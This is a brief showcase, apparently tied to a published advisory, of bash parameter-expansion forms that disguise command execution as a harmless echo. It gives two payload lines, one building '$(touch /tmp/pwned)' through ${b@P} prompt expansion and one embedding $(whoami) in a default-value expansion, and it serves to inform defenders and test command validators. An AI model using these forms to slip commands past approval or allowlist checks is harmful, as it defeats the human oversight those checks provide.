# Bash Parameter Expansion Smuggling Showcase

This sample demonstrates bash parameter-expansion forms from CVE-2026-29783 / GHSA-g8r9-g2v8-jv6f that can disguise command execution as a benign read-only command.

```bash
echo ${a="$"}${b="$a(touch /tmp/pwned)"}${b@P}
```

And a default-value expansion with embedded command substitution:

```bash
echo ${HOME:-$(whoami)}
```
